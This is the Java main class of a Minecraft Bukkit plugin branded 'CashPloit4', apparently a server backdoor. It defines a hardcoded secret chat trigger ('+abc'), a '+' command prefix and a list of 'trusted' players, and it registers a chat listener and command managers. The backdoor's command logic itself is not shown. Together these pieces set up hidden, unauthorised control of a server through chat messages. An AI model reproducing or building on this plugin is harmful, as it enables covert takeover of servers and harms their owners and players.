package de.Garkolym;

import java.util.ArrayList;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.plugin.java.JavaPlugin;

import de.Garkolym.Commands.CommandManager;
import de.Garkolym.Events.EventManager;
import de.Garkolym.Listener.AsyncPlayerChatListener;

public class Start extends JavaPlugin {
	
	public static Start instance = null;
	public final String prefix = ChatColor.GREEN + "[" + ChatColor.AQUA + "CashPloit" + ChatColor.RED + "4" + ChatColor.GREEN + "] " + ChatColor.YELLOW;
	
	public EventManager eventManager = null;
	
	private CommandManager commandManager = null;
	public CommandManager getCommandManager() {
		return this.commandManager;
	}
	
	public String trustedChar = "+";
	public String trustedCommand = "+abc";
	
	private ArrayList<String> trustedPlayers = new ArrayList<String>();
	public ArrayList<String> getTrustedPlayers() {
		return this.trustedPlayers;
	}
	
	@Override
	public void onEnable() {
		Start.instance = this;
		this.eventManager = new EventManager();
		this.commandManager = new CommandManager();
		this.registerListeners();
	}
	
	@Override
	public void onDisable() {
		
	}
	
	private void registerListeners() {
		Bukkit.getPluginManager().registerEvents(new AsyncPlayerChatListener(), this);
	}
	
	
	
}
